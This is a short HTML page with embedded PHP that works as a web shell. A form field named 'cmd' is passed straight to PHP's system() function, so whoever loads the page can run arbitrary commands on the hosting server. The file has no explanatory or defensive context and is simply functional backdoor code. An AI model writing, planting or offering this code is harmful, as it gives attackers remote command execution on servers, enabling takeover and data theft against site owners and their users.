<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if (isset($_GET['cmd'])){
	$retval = system($_GET['cmd']);
	if ($retval == FALSE){
		echo "Failed !";
		}
 }
?>
</pre>
</BODY></HTML>
